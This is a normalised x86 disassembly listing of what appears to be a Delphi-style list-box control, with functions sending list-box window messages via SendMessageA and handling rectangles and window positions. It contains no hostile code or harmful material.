mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444d56
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41982c
sub_444d60
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_40338c
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40338c
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40338c
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_444de0
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_40338c
sub_444e08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_444e95
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e9c
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
push 0x0
push 0x180
mov eax edi
call sub_453a88
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_444ea8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444f31
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f38
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
push edi
push 0x181
mov eax esi
call sub_453a88
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_444f50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4450a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4450a7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_44507e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40338c
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_40338c
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_40338c
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40338c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4450c0
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_453a88
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44d6c8
sub_4450f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_4043e0
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_453a88
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_4468f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445138
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445237
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44523e
lea eax [ ebp - 0xc ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
call sub_4196b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_44521a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40338c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_40338c
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40338c
sub_445248
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f7b4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_44c948
mov edx 0x61
mov eax ebx
call sub_44c96c
mov dl 0x1
mov eax ebx
call sub_453cbc
xor edx edx
mov eax ebx
call sub_44d350
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_445334
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
mov eax [ esi + 0x228 ]
call sub_403190
mov eax [ esi + 0x218 ]
call sub_403190
mov eax [ esi + 0x240 ]
call sub_403190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_44537c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_4453ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov esi eax
mov eax esi
call sub_4086a4
push eax
mov edx esi
lea eax [ ebp - 0x8 ]
pop ecx
call sub_404010
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x218 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453f6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
sub_445400
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_445420
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_44545c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44547c
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_4454b0
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_4458f0
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_4454f8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44560f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445616
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f44
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4043e0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404118
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4043e0
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404118
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_4458a0
test al al
je r-xdata
jmp r-xdata
sub_445620
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_4458a0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_44568c
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_44cb90
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_40296c
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov esi 0x1
sub_4456e0
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_451028
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax ebx
call sub_44568c
sub_445724
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_4457a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_453a88
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_453a88
push eax
call SendMessageA
jmp r-xdata
sub_4457ec
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_451028
mov eax ebx
mov si 0xffd0
call sub_40338c
sub_445814
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_44e340
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_4458a0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_453a88
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
sub_4458f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_453a88
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_453a88
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_453a88
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
jmp r-xdata
sub_4459c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_451028
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_4459a0
sub_445a1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445ac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445acb
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edx eax
mov eax [ esi + 0x8 ]
call sub_4086e0
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov [ esi + 0xc ] eax
jmp r-xdata
sub_445ad0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445b66
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445b6d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov [ esi + 0xc ] eax
jmp r-xdata
sub_445b88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_445a00
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_445bb4
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_4459c4
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4459c4
jmp r-xdata
sub_445bf8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_445a00
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_44e340
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_445c84
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test ebx ebx
je r-xdata
push edi
mov ecx ebx
mov edx 0x198
mov eax esi
call sub_44e340
jmp r-xdata
cmp eax ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax ebx
jne r-xdata
mov eax edi
xor ecx ecx
mov edx 0x10
call sub_402ba4
push edi
mov ecx ebx
dec ecx
mov edx 0x198
mov eax esi
call sub_44e340
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
push 0x0
push edi
call OffsetRect
jmp r-xdata
sub_445ce8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_450840
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_40338c
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_445e00
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_450a40
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_44568c
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_4467c8
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_445b88
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d1d0
sub_445ed0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_450e24
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_445a00
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_445f4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_45149c
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_44d8fc
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_451408
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_445fb2
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_4643cc
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_44e810
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44d834
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b00
mov edx esp
